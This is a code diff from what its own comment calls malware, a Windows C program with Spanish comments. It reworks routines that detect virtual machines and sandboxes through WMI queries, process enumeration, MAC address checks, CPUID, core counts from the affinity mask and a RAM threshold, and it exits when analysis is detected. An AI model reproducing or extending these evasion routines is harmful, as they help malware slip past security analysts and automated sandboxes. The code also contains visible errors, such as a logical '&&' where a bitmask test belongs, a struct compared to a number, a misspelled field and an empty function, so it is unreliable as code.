@@ -48,19 +48,30 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine,
 	
 	
 	
-	if(CHECK_VM()){
+	if(CHECK_SPEC_VM_INFO()){
 		Exit(1);
 		}
     }
 
-static BOOL CHECK_VM(){
+static DWORD WINAPI WAIT_SVTIME(LPVOID lpstart){
+	
+	int start_time = (int)lpstart;
+	while(GetTickCount() - start_time < 60000){
+		if(PGLOB->CON_REALIZED) ExitThread(1);
+		Sleep(10);
+		}
+		Exit(1);
+	}
+	
+static BOOL CHECK_SPEC_VM_INFO(){ 
+	
+	int FUNC_EXCEPTION = 0;
 	
 	int gb_size = 257;
-	BOOL ProcError = FALSE;
 	HRESULT hres = CoInitializeEx(0, COINIT_MULTITHREADED); //Inicialización de la biblioteca COM para ser usada por el subproceso que haga la llamada. La simultaneidad Multi-threading (también llamado free-threading) permite que las llamadas a métodos de objetos creados por este hilo se ejecuten en cualquier hilo. No hay serialización de llamadas, es decir, pueden ocurrir muchas llamadas al mismo método
     //Hay que configurar las llamadas a la WMI
 	
-	if(FAILED(hres)){ProcError = FALSE;goto check_vmprocess;}
+	if(FAILED(hres)){FUNC_EXCEPTION++;goto check_vmprocess;}
 	
 	//Inicialización para la seguridad del proceso COM. 
 	hres =  CoInitializeSecurity(
@@ -75,7 +86,7 @@ static BOOL CHECK_VM(){
     NULL //Siempre es NULL                   
     );
 	
-	if(FAILED(hres)){ ProcError = TRUE;CoUninitialize(); goto check_vmprocess;}
+	if(FAILED(hres)){ FUNC_EXCEPTION++;CoUninitialize(); goto check_vmprocess;}
 	
 	IWbemLocator *loc = NULL; //Objeto COM en proceso. Interfaz para obtener el puntero a la interfaz para acceder a WMI
 	
@@ -85,7 +96,7 @@ static BOOL CHECK_VM(){
     CLSCTX_INPROC_SERVER, //Contexto donde operará este objeto. Se ejecutará en el mismo proceso que el que llamó la función creadora del contexto
     IID_IWbemLocator, (LPVOID *) &loc); //Interfaz puntero de la interfaz que nos brindará acceso a la WMI
     
-    if(FAILED(hres)){ ProcError = TRUE;CoUninitialize(); goto check_vmprocess;}
+    if(FAILED(hres)){ FUNC_EXCEPTION++;CoUninitialize(); goto check_vmprocess;}
     
     IWbemServices *svc = NULL; //Interfaz que nos permitirá acceder a la WMI
     
@@ -107,7 +118,7 @@ static BOOL CHECK_VM(){
      PGLOB->CON_REALIZED = TRUE;
      
      
-     if(FAILED(hres)){ProcError = TRUE; loc->Release();CoUninitialize(); goto check_vmprocess;}
+     if(FAILED(hres)){FUNC_EXCEPTION++; loc->Release();CoUninitialize(); goto check_vmprocess;}
      
      hres = CoSetProxyBlanket(//Inicialización de la seguridad del proxy creado para que WMI tome el papel del cliente en la consulta al namespace
      svc,  //Proxy que se establecerá                  
@@ -120,7 +131,7 @@ static BOOL CHECK_VM(){
      EOAC_NONE //Ninguna capacidad extra para este proxy              
     );
     
-    if(FAILED(hres)){ ProcError = TRUE;loc->Release();svc->Release();CoUninitialize(); goto check_vmprocess;}
+    if(FAILED(hres)){ FUNC_EXCEPTION++;loc->Release();svc->Release();CoUninitialize(); goto check_vmprocess;}
     
     IEnumWbemClassObject* _enum = NULL; //Interfaz para enumerar los componentes WMI
     hres = svc->ExecQuery(//Ejecutar nuestra solicitud
@@ -130,7 +141,7 @@ static BOOL CHECK_VM(){
     NULL, 
      _enum); //Donde almacenaremos la consulta
     
-    if(FAILED(hres)){ProcError = TRUE;_enum->Release(); loc->Release();svc->Release();CoUninitialize(); goto check_vmprocess;}
+    if(FAILED(hres)){FUNC_EXCEPTION++;_enum->Release(); loc->Release();svc->Release();CoUninitialize(); goto check_vmprocess;}
     
     IWbemClassObject *obj = NULL;
     
@@ -166,13 +177,13 @@ static BOOL CHECK_VM(){
          
          char *buffer = (char*)HeapAlloc(GetCurrentHeap(), HEAP_GENERATE_EXCEPTIONS, 1024);
          if(CHECK_ALLOC_ERROR(0,0,TRUE,buffer)){
-         	ProcError = TRUE;
+         	FUNC_EXCEPTION++;
              HeapFree(GetCurrentHeap(), 0, buffer);
              goto vm_checks;
          	}
          handle = EnumProcesses(pids, sizeof(pids), &rvsize);
          if(!handle){
-         	ProcError = TRUE;
+         	FUNC_EXCEPTION++;
              HeapFree(GetCurrentHeap(), 0, buffer);
              goto vm_checks;
          }
@@ -181,7 +192,7 @@ static BOOL CHECK_VM(){
          for(int i = 0; i < proc;i++){
          	HANDLE hproc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pids[i]);
              
-             if(hproc != NULL){
+             if(!CHECK_ALLOC_ERROR(2,2,TRUE, hproc)){
              	EnumProcessModules(hproc, &hm, sizeof(hm), &ned);
                  GetModuleBaseName(hproc, hm, buffer, sizeof(buffer) / sizeof(char*));
                  CloseHandle(hproc);
@@ -193,7 +204,7 @@ static BOOL CHECK_VM(){
              	}
              else{
                  HeapFree(GetCurrentHeap(),0,buffer);
-                 ProcError = TRUE;
+                 FUNC_EXCEPTION++;
                  CloseHandle(hproc);
                  goto vm_checks;
                  }
@@ -202,23 +213,12 @@ static BOOL CHECK_VM(){
        CloseHandle(hproc);  
         vm_checks:
         if(pid != 0) return TRUE;
-        else{
-        	BOOL SOME_BOOLEAN = CHECK_SPEC_VM_INFO();
-            if(SOME_BOOLEAN){
-                return TRUE;
-                }
-        	}
-        }
-    //Si algo de esto no llega a ser suficiente, tendríamos que analizar en memoria para encontrar los procesos
-    if(!ProcError) return FALSE;
-    Exit(1);
-	}
-	
+    	}
+    }
 	
 	
 
 /*
-DESCRIPCIONES de la función CHECK_VM:
 
 WMI: Una especie de base de datos con clases con información sobre hardware y el sistema operativo.
 
@@ -284,21 +284,8 @@ Sin embargo, una aplicación de 32 bits que solicita instancias de Windows Drive
 el repositorio WMI es un contenedor de datos multipropósito que no se puede DETECTAR ni quitar.
 */
 
-
-
-static DWORD WINAPI WAIT_SVTIME(LPVOID lpstart){
-	int start_time = (int)lpstart;
-	while(GetTickCount() - start_time < 60000){
-		if(PGLOB->CON_REALIZED) ExitThread(1);
-		Sleep(10);
-		}
-		Exit(1);
-	}
-static BOOL CHECK_SPEC_VM_INFO(){ 
-	
-	int FUNC_EXCEPTION = 0;
 	//OBTENER LAS MAC DE LA VM, SI NO FUERON CAMBIADAS, FUNCIONARÁ
-    BOOL ANY_EXEC_CHECK = FALSE;
+    //BOOL ANY_EXEC_CHECK = FALSE;
 
 	PIP_ADAPTER_INFO adapter; //Estructura con información sobre networks adapters
     ULONG BUFF = sizeof(IP_ADAPTER_INFO); //Buffer por si hay una excepción
@@ -723,8 +710,65 @@ static BOOL CHECK_SPEC_VM_INFO(){
  NopInstr:
  nop
  }
+
  if(cpuid) return TRUE;
  
+    //Otro método para obtener los núcleos
+    DWORD newcount = 0;
+    int bits = 0, arch = 0;
+    ULONG_PTR process_mask, system_mask;
+
+    BOOL mask_handle = GetProcessAffinityMask(GetCurrentProcess(), &process_mask, &system_mask); //Recupera la Affinity mask para el proceso y el sistema
+    /*
+    Una cadena de bits es una estructura donde se almacenan bits, que pueden ser implementadas para formar estructura de datos, y es útil
+    en la computación paralela basados en el número de bits (según el conjunto de bits que interpreta el procesador), donde se realizan muchos cálculos a la vez.
+    
+    Operaciones bit a bit: Operaciones que dan lugar en las cadenas de bits
+    
+    Campo de bits: Estructura de datos formados por bits asignados para mantener una secuencia de bits. Son usados en los procesadores para indicar el resultado de una operación (más info) https://en.m.wikipedia.org/wiki/Bit_field
+    
+    Máscara de bits: Datos usados en las operaciones bit a bit, en los campos de bits. Usando estas máscaras, se pueden hacer operaciones en un byte (8 bits)
+    
+    La Affinity Mask es una máscara de bits que específica en que procesador o núcleo debe ejecutarse un proceso. Es útil porque el primer núcleo puede estar reservado para software especial y se puede evitar para obtener mayor procesamiento y rendimiento.
+    esta máscara estaba formado por un vector de bits en el que cada bit especificaba un núcleo/proceso en el que se pueden ejecutar los procesos
+
+    
+    
+    */
+    
+    //Una máscara de bits es un bit array (estructura de datos), con capacidad de 32 o 64 bits según la arquitectura
+    #ifndef _WIN64
+    arch = 32;
+    #else
+    arch = 64;
+    #endif
+    
+    if(!mask_handle){
+    	FUNC_EXCEPTION++;
+        goto blacklist_check3;
+    	}
+    //Recontamos los núcleos gracias a la máscara de afinidad
+    do{
+    	if((1 << bits) && system_mask){ //Conteamos los bits de la máscara del sistema
+    	    newcount++;
+            bits++;
+    	    }
+    	}while(bits < arch); //Recorremos todo el vector de bits según la capacidad de memoria de la arquitectura
+    if(newcount < 2) return TRUE;
+    
+    blacklist_check3:
+    
+    MEMORYSTATUS_EX mem_status;
+    ZeroMemory(&mem_status, sizeof(mem_status));
+    DWORDLONG ram =  (1024LL * (1024LL * (1024LL * 1LL)));  //1 GB
+    
+    mem_status.dwLenght = sizeof(mem_status);
+    GlobalMemoryStatusEx(&mem_status); //Obtenemos la memoria física (Tiene en cuenta la memoria virtual y sus páginas de memoria, que es una gestión de memoria que hace como si hubiera más memoria)
+    
+    if(mem_status < ram) return TRUE; //Las máquinas virtuales no superan el 1GB promedio por socket
+    
+    
+    
     
 	if(FUNC_EXCEPTION != 0) Exit(1); //Explicación: Esta variable registra los fallos cometidos en las funciones, y salta al siguiente módulo para hacer que el malware sea lo más estable
                                                                //posible. Pero claro, si luego resulta que han dado negativo las pruebas, y nos hemos saltado módulos, pues no podremos asegurarnos de que haya VM o no, por lo que provocará una excepción;
@@ -796,4 +840,10 @@ BOOL CHECK_ALLOC_ERROR(int arg, short DATA_TYPE_ID, BOOL RETURN, ...){
 		    }
 		}
 	return FALSE;
+	}
+	
+
+static VARIANT WMI_QUERY(){
+	
+	
 	}
